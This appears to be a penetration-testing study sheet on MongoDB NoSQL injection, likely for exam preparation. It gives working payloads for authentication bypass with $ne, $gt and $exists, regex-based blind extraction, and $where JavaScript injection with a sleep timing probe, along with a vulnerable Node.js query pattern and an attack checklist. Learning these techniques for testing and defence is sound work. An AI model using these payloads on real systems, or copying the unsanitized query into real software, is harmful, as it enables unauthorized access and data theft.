## Advanced Injection Attacks — MongoDB NoSQL Injection

## Objective
Exploit MongoDB query behavior to:
- Bypass authentication
- Extract data
- Manipulate queries

Think: *“Can I inject operators instead of values?”*

---

## 1. MongoDB Query Basics

### Normal query

```javascript
db.users.find({
  username: "admin",
  password: "123456"
})
```

---

### Backend (Node.js example)

```javascript
db.collection('users').find({
  username: req.body.username,
  password: req.body.password
})
```

---

## 2. Injection Point

User input directly inserted into query object

---

### Example request

```json
{"username":"admin","password":"test"}
```

---

## 3. Authentication Bypass

### A. `$ne` operator

```json
{"username":"admin","password":{"$ne":null}}
```

→ Matches any password ≠ null

---

### B. `$gt` operator

```json
{"username":"admin","password":{"$gt":""}}
```

---

### C. `$exists`

```json
{"username":"admin","password":{"$exists":true}}
```

---

## 4. Login Bypass via URL Encoding

```text
username=admin&password[$ne]=null
```

---

## 5. Data Extraction via Regex

### A. Enumerate username

```json
{"username":{"$regex":"^a"},"password":{"$ne":null}}
```

---

### B. Iterate characters

```json
{"username":{"$regex":"^ad"},"password":{"$ne":null}}
```

---

### Goal

- Extract values character by character

---

## 6. Blind Extraction

### Boolean-based

```json
{"username":{"$regex":"^a"}}
```

→ True/false via response difference

---

## 7. JavaScript Injection (if enabled)

### `$where` operator

```json
{
  "$where": "this.username == 'admin' && this.password.length > 0"
}
```

---

### Dangerous example

```json
{
  "$where": "sleep(5000)"
}
```

→ Delay confirms execution

---

## 8. Common Vulnerabilities

- Direct use of user input in query
- No input validation
- Allowing operators (`$ne`, `$gt`, `$regex`)
- `$where` enabled

---

## 9. Indicators of Vulnerability

- Login bypass with operator
- Different responses using `$regex`
- Delays using `$where`
- No errors on malformed input

---

## 10. Fast Workflow (Exam Mode)

1. Identify MongoDB usage (JSON API)
2. Test login bypass:

```json
{"password":{"$ne":null}}
```

3. Try:
   - $gt
   - $exists
4. Use regex for extraction
5. Test `$where` for code execution
6. Confirm:
   - bypass or data leak

---

## 11. Mental Model

MongoDB doesn’t parse strings like SQL.

It interprets objects.

If you control the object:
→ You control the query logic